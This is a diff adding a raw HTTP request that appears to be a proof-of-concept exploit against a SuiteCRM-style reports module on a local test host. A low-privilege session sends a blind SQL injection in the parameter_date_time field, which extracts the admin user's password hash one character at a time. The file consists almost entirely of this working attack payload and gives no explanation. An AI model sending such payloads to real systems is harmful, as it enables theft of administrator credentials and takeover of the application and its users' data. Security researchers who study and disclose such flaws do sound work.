@@ -1,0 +1,6 @@
+POST /index.php HTTP/1.1
+Host: localhost:33116
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=<low-priv session>
+
+module=AOR_Reports&action=changeReportPage&record=<RID>&parameter_id[0]=<CID>&parameter_type[0]=Date&parameter_operator[0]=Equal_To&parameter_value[0]=now&parameter_date_value[0]=now&parameter_date_sign[0]=plus&parameter_date_number[0]=1&parameter_date_time[0]=DAY) OR (STRCMP(SUBSTRING((SELECT user_hash FROM users WHERE user_name=0x61646d696e),1,1),CHAR(36))=1)) AND ((1=1
